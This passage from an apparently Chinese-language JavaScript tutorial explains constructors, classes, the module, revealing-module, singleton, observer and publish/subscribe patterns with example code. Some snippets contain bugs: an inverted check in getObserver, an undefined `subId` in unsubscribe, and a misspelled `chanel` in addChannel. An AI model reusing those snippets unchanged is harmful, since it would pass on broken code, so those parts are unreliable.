class="token comment">// &#123; type: "Human", name: "Knight" &#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>knight<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// "Knight"</span><span class="token keyword">var</span> cloud <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>cloud<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// "Human"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是 ES5 原生的写法，在 ES6 中可以使用<strong>类</strong>的概念进行改造：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 类的构造器</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">'Human'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// 实例的公共方法</span>    <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> knight <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'Knight'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>knight<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// &#123; type: "Human", name: "Knight" &#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>knight<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// "Knight"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="模块化模式"><a href="#模块化模式" class="headerlink" title="模块化模式"></a>模块化模式</h2><p>模块是健壮的应用程序里不可或缺的一部分，模块化能助于系统各单元的合理分工，并维持清晰有组织的联系；模块可以提供私有和公共的封装方法，现代实现模块化的方式有多种，如 AMD, CommonJS, ES Module 等；</p><p>一个极简的模块可以用一个对象字面量表示：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> module <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token function-variable function">getA</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>module<span class="token punctuation">.</span><span class="token function">getA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>module<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>模块中的属性都可看作维护的“私有”变量，如 <code>module.a</code> 的值并不与全局的 <code>a</code> 冲突，但是这也仅仅是防止了模块内外的变量命名冲突，其实还是能进行全局访问或修改，准确讲上面的模块的属性都为“公共”属性；</p><p>但很多时候又确实需要维护一些仅模块内部可访问的私有属性或变量，下面便是一种使用<strong>闭包</strong>特性实现的常用手法：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> module <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token function-variable function">getA</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> a<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token function-variable function">setA</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            a <span class="token operator">=</span> n<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>module<span class="token punctuation">.</span><span class="token function">getA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>module<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>module<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span>module<span class="token punctuation">.</span><span class="token function">setA</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>module<span class="token punctuation">.</span><span class="token function">getA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即模块通过某些方式，暴露一个公共的接口，以提供外部访问或修改模块内部某些属性或变量的途径；</p><h2 id="暴露模块模式"><a href="#暴露模块模式" class="headerlink" title="暴露模块模式"></a>暴露模块模式</h2><p>暴露模块，即在模块化的基础上，实现对私有或公有成员的改名，甚至成员之间的相互访问：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> module <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">privateFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">publicFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> r <span class="token operator">=</span> <span class="token function">privateFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> r<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">b</span><span class="token operator">:</span> a<span class="token punctuation">,</span>        <span class="token literal-property property">renameFn</span><span class="token operator">:</span> publicFn    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>module<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>module<span class="token punctuation">.</span><span class="token function">renameFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样做可以实现将模块内部的私有属性，以更加规范化或标准化的方式展现（暴露给外部），增强可读性；</p><h2 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h2><p>单例模式（Singleton Pattern）中，单例是指类只有一个实例对象，实现思路可以是返回一个实例对象时，如果未初始化则初始化后返回，已经初始化则返回对它的引用；</p><p>单例类有且只有一个自己的实例，并能提供给作用域中所有其他对象访问；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> Singleton <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> instance<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> r <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">r</span><span class="token operator">:</span> r        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 单例模式的方法，只实例化一次</span>        <span class="token function-variable function">getR</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>instance<span class="token punctuation">)</span> instance <span class="token operator">=</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> instance<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token comment">// 非单例模式的方法，每次都实例化</span>        <span class="token function-variable function">_getR</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 下面的输出值随机，不过两次输出相同</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Singleton<span class="token punctuation">.</span><span class="token function">getR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0.9703895249107328</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Singleton<span class="token punctuation">.</span><span class="token function">getR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0.9703895249107328</span><span class="token comment">// 两次输出不同</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Singleton<span class="token punctuation">.</span><span class="token function">_getR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0.49340212997805155</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Singleton<span class="token punctuation">.</span><span class="token function">_getR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0.06939910709339148</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接的对象定义（对象字面量）是最简单的单例模式，因为利用变量声明的不可重复特性，保证了对象的唯一性与作用域可访问性；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Knight'</span><span class="token punctuation">,</span>    <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">22</span><span class="token punctuation">,</span>    <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h2><p>观察者模式（Observer Pattern）由被观察者和观察者组成，观察者可以是多个，被观察者维护着多个观察者，如添加或删除观察者；当被观察着数据变化时，会通过广播的方式通知维护的每一个观察者（即调用观察者提供的回调函数）；</p><p>简单实现：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 被观察者</span><span class="token keyword">class</span> <span class="token class-name">Source</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 维护的一组观察者</span>    observers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 获取观察者</span>    <span class="token function">getObserver</span><span class="token punctuation">(</span><span class="token parameter">idx</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>observers<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>observers<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 添加观察者</span>    <span class="token function">addObserver</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>obs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>observers<span class="token punctuation">,</span> obs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 删除指定观察者</span>    <span class="token function">deleteObserver</span><span class="token punctuation">(</span><span class="token parameter">idx</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>observers<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 发布通知（广播）的函数</span>    <span class="token function">notify</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>observers<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">x</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 执行观察者提供的回调，实现通知数据的变化</span>            x<span class="token punctuation">.</span><span class="token function">callback</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Notified '</span> <span class="token operator">+</span> x<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 观察者</span><span class="token keyword">class</span> <span class="token class-name">Observer</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token function">callback</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义两个观察者，接口要和被观察者里的一直</span><span class="token keyword">const</span> observer1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Observer</span><span class="token punctuation">(</span><span class="token string">'observer1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> observer2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Observer</span><span class="token punctuation">(</span><span class="token string">'observer2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 注册观察者</span><span class="token keyword">const</span> source <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>source<span class="token punctuation">.</span><span class="token function">addObserver</span><span class="token punctuation">(</span>observer1<span class="token punctuation">,</span> observer2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 发布通知</span>source<span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span><span class="token string">'I am changed.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 随后会输出以下内容，表示通知到了被观察者们</span><span class="token comment">// I am changed.</span><span class="token comment">// Notified observer1</span><span class="token comment">// I am changed.</span><span class="token comment">// Notified observer2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="发布-订阅模式"><a href="#发布-订阅模式" class="headerlink" title="发布/订阅模式"></a>发布/订阅模式</h2><p>发布/订阅模式是在观察者模式的一种变体，区别在于，观察者模式每个观察者想要接收通知需要到被观察者上面去注册，而发布/订阅模式的原理是发布者（可以理解为之前的被观察者）将信息发送到指定的频道(channel)上，如果订阅者（理解为观察者）对某个频道感兴趣，就可以订阅该频道以接收消息，不感兴趣后还可以取消订阅（整个过程和平时订阅杂志蛮像的）；所以其相比于观察者模式的优点便是减小了信息发布者和接收者的依赖性和耦合度；</p><p>简单实现：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 发布者</span><span class="token keyword">class</span> <span class="token class-name">Publisher</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 定义一些固定的频道供订阅者订阅</span>    <span class="token comment">// 每个频道都维护着多个订阅者，数组长度即订阅者数量</span>    channels <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">'Game'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string-property property">'Movie'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string-property property">'Music'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 每个订阅者的唯一标识符</span>    subId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment">// 订阅者实现订阅的函数</span>    <span class="token comment">// 参数包括要订阅的频道和回调函数</span>    <span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">channel<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>channels<span class="token punctuation">[</span>channel<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 某频道的每个订阅者包含的信息，</span>            <span class="token comment">// 包括一个唯一标识符和一个回调函数</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>channels<span class="token punctuation">[</span>channel<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                <span class="token literal-property property">subId</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>subId<span class="token operator">++</span><span class="token punctuation">,</span>                callback            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Channel not found!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 为订阅者取消订阅</span>    <span class="token function">unsubscribe</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> k <span class="token keyword">in</span> <span class="token keyword">this</span><span class="token punctuation">.</span>channels<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>channels<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>channels<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>subId<span class="token punctuation">]</span> <span class="token operator">===</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>channels<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        found <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 为指定频道发布通知</span>    <span class="token function">publish</span><span class="token punctuation">(</span><span class="token parameter">channel<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>channels<span class="token punctuation">[</span>channel<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>channels<span class="token punctuation">[</span>channel<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">x</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                x<span class="token punctuation">.</span><span class="token function">callback</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Channel not found!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 添加消息发布频道</span>    <span class="token function">addChannel</span><span class="token punctuation">(</span><span class="token parameter">channel</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>channels<span class="token punctuation">[</span>channel<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Channel existed!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>channels<span class="token punctuation">[</span>chanel<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 删除指定频道</span>    <span class="token function">deleteChannel</span><span class="token punctuation">(</span><span class="token parameter">channel</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>channels<span class="token punctuation">[</span>channel<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">delete</span> <span class="token keyword">this</span><span class="token punctuation">.</span>channels<span class="token punctuation">[</span>channel<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token 